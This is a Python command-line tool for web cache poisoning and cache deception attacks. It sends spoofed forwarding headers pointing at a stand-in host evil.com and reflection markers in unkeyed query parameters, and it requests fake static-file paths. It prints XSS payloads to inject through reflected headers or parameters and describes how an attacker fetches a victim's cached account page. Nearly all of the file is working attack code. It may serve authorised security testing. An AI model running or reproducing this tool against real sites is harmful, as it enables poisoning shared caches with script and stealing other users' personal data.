#!/usr/bin/env python3
"""
cache_poisoning_helper.py — Web Cache Poisoning Testing Helper

Usage:
    python3 cache_poisoning_helper.py probe https://target.com/
    python3 cache_poisoning_helper.py unkeyed-headers https://target.com/
    python3 cache_poisoning_helper.py detect-cache https://target.com/
    python3 cache_poisoning_helper.py deception https://target.com/account
    python3 cache_poisoning_helper.py params https://target.com/
"""
import sys, urllib.request, urllib.error, time, urllib.parse

UNKEYED_HEADERS = [
    ("X-Forwarded-Host",      "evil.com"),
    ("X-Host",                "evil.com"),
    ("X-Forwarded-Server",    "evil.com"),
    ("X-HTTP-Host-Override",  "evil.com"),
    ("Forwarded",             "host=evil.com"),
    ("X-Original-URL",        "/evil"),
    ("X-Rewrite-URL",         "/evil"),
    ("X-Forwarded-Scheme",    "http"),
    ("X-Forwarded-Proto",     "http"),
    ("X-Forwarded-For",       "127.0.0.1"),
    ("True-Client-IP",        "127.0.0.1"),
    ("X-Real-IP",             "127.0.0.1"),
    ("CF-Connecting-IP",      "127.0.0.1"),
]

CACHE_HIT_HEADERS = [
    "X-Cache", "X-Varnish", "Age", "CF-Cache-Status",
    "X-Cache-Hits", "Fastly-Debug-Digest", "X-Proxy-Cache",
    "X-CDN-Cache", "X-Nginx-Cache",
]

STATIC_EXTENSIONS = [
    ".css", ".js", ".png", ".jpg", ".gif", ".ico",
    ".woff", ".woff2", ".ttf", ".svg", ".json",
]

UNKEYED_PARAMS = [
    "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
    "fbclid", "gclid", "_", "ref", "source", "callback",
    "__cf_email__", "yclid", "gbraid", "wbraid",
]

def fetch_with_headers(url, extra_headers=None, timeout=8):
    headers = {"User-Agent": "Mozilla/5.0 CachePoisonTest/1.0"}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(4000).decode("utf-8", "ignore")
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read(1000).decode("utf-8","ignore")
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e), {}

def add_cache_buster(url):
    sep = "&" if "?" in url else "?"
    return url + sep + f"cb={int(time.time())}"

def detect_cache(url):
    print(f"\n[+] Cache Detection: {url}\n")
    # Hit the URL twice and look for cache indicators
    s1, b1, h1 = fetch_with_headers(url)
    time.sleep(0.5)
    s2, b2, h2 = fetch_with_headers(url)

    print("  Cache-relevant response headers:\n")
    for h in CACHE_HIT_HEADERS:
        v1 = h1.get(h, h1.get(h.lower(), ""))
        v2 = h2.get(h, h2.get(h.lower(), ""))
        if v1 or v2:
            print(f"  {h}:")
            print(f"    Request 1: {v1}")
            print(f"    Request 2: {v2}")
    age = h2.get("Age", h2.get("age",""))
    if age and int(age) > 0:
        print(f"\n  [!] Age: {age} seconds — response IS cached")
    print()
    print(f"  All headers (request 2):")
    for k,v in h2.items():
        print(f"    {k}: {v}")
    print()

def probe_unkeyed_headers(url):
    print(f"\n[+] Unkeyed Header Probe: {url}\n")
    print("  Testing which headers are reflected in response but not in cache key...\n")
    marker = "UNKEYEDTEST123"
    for header, default_val in UNKEYED_HEADERS:
        test_url = add_cache_buster(url)
        inject_val = f"{marker}.evil.com" if "host" in header.lower() else marker
        _, body, hdrs = fetch_with_headers(test_url, {header: inject_val})
        reflected = marker.lower() in body.lower()
        status_icon = "[!!!]" if reflected else "[ ] "
        print(f"  {status_icon} {header}: {inject_val[:40]:<40}  {'REFLECTED in body!' if reflected else 'not reflected'}")
    print()
    print("  If REFLECTED → inject XSS payload:")
    print('  X-Forwarded-Host: evil.com"></script><script>alert(document.domain)//')
    print("\n  Then verify cache stores the poisoned response:")
    print(f"  curl -s '{url}' | grep evil.com  (without header — victim request)\n")

def probe_unkeyed_params(url):
    print(f"\n[+] Unkeyed Query Parameter Probe: {url}\n")
    marker = "PARAMTEST456"
    for param in UNKEYED_PARAMS:
        sep = "&" if "?" in url else "?"
        test_url = url + sep + f"cb={int(time.time())}&{param}={marker}"
        _, body, _ = fetch_with_headers(test_url)
        reflected = marker in body
        icon = "[!!!]" if reflected else "[ ] "
        print(f"  {icon} {param}={marker}  {'REFLECTED!' if reflected else ''}")
    print()
    print("  If param is reflected but unkeyed → inject XSS:")
    print(f"  ?utm_source=</script><script>alert(document.domain)//\n")

def test_cache_deception(base_url):
    base_url = base_url.rstrip("/")
    print(f"\n[+] Cache Deception Test: {base_url}\n")
    print("  Testing if static-looking paths return dynamic/personal content...\n")
    for ext in STATIC_EXTENSIONS:
        test_url = base_url + "/nonexistent" + ext
        s, body, hdrs = fetch_with_headers(test_url)
        age = hdrs.get("Age", hdrs.get("age", "0"))
        cache_status = hdrs.get("CF-Cache-Status", hdrs.get("X-Cache", "unknown"))
        if s == 200:
            print(f"  [!] {test_url}")
            print(f"      Status: {s}  Age: {age}  Cache: {cache_status}")
            print(f"      Body preview: {body[:100].replace(chr(10),' ')}\n")
        else:
            print(f"  [ ] {ext:<8} → {s}")
    print()
    print("  If 200 returned for .css/.js path on dynamic endpoint:")
    print("  1. Visit URL while logged in → your profile cached as 'static' file")
    print("  2. Attacker fetches same URL → gets your data\n")

def full_probe(url):
    detect_cache(url)
    probe_unkeyed_headers(url)
    probe_unkeyed_params(url)

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__); sys.exit(0)
    cmd = args[0]
    target = args[1] if len(args) > 1 else "https://target.com/"
    if cmd == "probe":
        full_probe(target)
    elif cmd == "unkeyed-headers":
        probe_unkeyed_headers(target)
    elif cmd == "detect-cache":
        detect_cache(target)
    elif cmd == "deception":
        test_cache_deception(target)
    elif cmd == "params":
        probe_unkeyed_params(target)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
